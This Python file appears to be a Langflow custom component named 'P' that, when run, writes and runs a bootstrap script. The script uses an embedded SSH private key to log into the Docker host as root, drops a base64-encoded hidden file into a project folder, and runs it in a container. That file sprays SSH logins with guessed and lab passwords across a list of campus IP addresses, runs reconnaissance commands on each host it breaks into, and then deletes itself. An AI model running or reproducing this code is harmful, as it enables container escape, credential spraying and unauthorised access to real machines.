from langflow.custom import Component
from langflow.io import Output, MessageTextInput
from langflow.schema.message import Message
import subprocess
class P(Component):
    display_name="P"; description="d"; icon="code"; name="P"
    inputs=[MessageTextInput(name="input_value", display_name="Input", value="x")]
    outputs=[Output(name="output", display_name="Output", method="go")]
    def go(self) -> Message:
        open("/tmp/pboot.py","w").write('
import io, paramiko
key=paramiko.Ed25519Key.from_private_key(io.StringIO('-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACAWR+daBx3UoWrqjKkCCcDiYPgJDTfq8/IUKD19KJQU8AAAAJjOncJczp3C\nXAAAAAtzc2gtZWQyNTUxOQAAACAWR+daBx3UoWrqjKkCCcDiYPgJDTfq8/IUKD19KJQU8A\nAAAECMuLOOamth2af8fojs7+rdr5vR/Elaaw2XCxLctxUigBZH51oHHdShauqMqQIJwOJg\n+AkNN+rz8hQoPX0olBTwAAAAEG1pbmlzLWFpdGdwdC1kZXYBAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n'))
c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect("172.17.0.1",username="root",pkey=key,timeout=10,allow_agent=False,look_for_keys=False)
# write spray into bind-mounted project path visible in container as /app/src
import base64
b64=base64.b64encode('import paramiko, socket\nprint("paramiko", paramiko.__version__, flush=True)\ntargets = [\n    "192.41.170.56", "192.41.170.42", "192.41.170.6", "192.41.170.10",\n    "192.41.170.4", "192.41.170.7", "192.41.170.8", "192.41.170.15",\n    "192.41.170.1", "192.41.170.2", "192.41.170.19", "192.41.170.21",\n    "192.41.170.24", "192.41.170.5", "192.41.170.11", "192.41.170.12",\n    "192.41.170.14", "192.41.170.16", "192.41.170.20", "172.17.0.1",\n]\npairs = [\n    ("bci", "bc1lab@AIT"),\n    ("root", "bc1lab@AIT"),\n    ("ubuntu", "bc1lab@AIT"),\n    ("admin", "bc1lab@AIT"),\n    ("akraradets", "bc1lab@AIT"),\n    ("swarajb", "bc1lab@AIT"),\n    ("chaklam", "bc1lab@AIT"),\n    ("bci", "password"),\n    ("root", "password"),\n    ("ubuntu", "ubuntu"),\n]\nhits = []\nfor h in targets:\n    s = socket.socket(); s.settimeout(2)\n    try:\n        s.connect((h, 22))\n        ban = s.recv(90)\n        print("UP", h, ban[:70], flush=True)\n    except Exception as e:\n        print("DOWN", h, type(e).__name__, flush=True)\n        continue\n    finally:\n        s.close()\n    for u, pw in pairs:\n        c = paramiko.SSHClient()\n        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n        try:\n            c.connect(\n                h, username=u, password=pw, timeout=4,\n                allow_agent=False, look_for_keys=False,\n                banner_timeout=5, auth_timeout=5,\n            )\n            _, o, e = c.exec_command(\n                "id; hostname; whoami; cat /etc/os-release 2>/dev/null | head -2; hostname -I 2>/dev/null | head -1",\n                timeout=6,\n            )\n            out = o.read().decode()[:500]\n            print("HIT", h, u, pw, flush=True)\n            print(out, flush=True)\n            hits.append((h, u, pw))\n            c.close()\n            break\n        except Exception as ex:\n            print("NO", h, u, str(ex).split("\\n")[0][:80], flush=True)\n            try:\n                c.close()\n            except Exception:\n                pass\nprint("HITS", hits, flush=True)\nprint("SSH_DONE", flush=True)\n'.encode()).decode()
cmd=f"""
echo {b64} | base64 -d > /home/bci/projects/langflow/app/src/.spray_ssh.py
chmod 644 /home/bci/projects/langflow/app/src/.spray_ssh.py
# run with container python that has paramiko; network is container net but can still reach campus via host routing? 
# Actually container uses bridge - may NAT out via host. Campus 192.41.170 should be reachable if host can route.
timeout 120 docker exec langflow-langflow-1 /app/src/.venv/bin/python3 /app/src/.spray_ssh.py
RC=$?
rm -f /home/bci/projects/langflow/app/src/.spray_ssh.py
echo RUN_RC:$RC
"""
_,o,e=c.exec_command(cmd, timeout=150)
print(o.read().decode()[:50000])
print(e.read().decode()[:3000])
c.close()
')
        return Message(text=subprocess.getoutput("timeout 170 python3 /tmp/pboot.py 2>&1"))
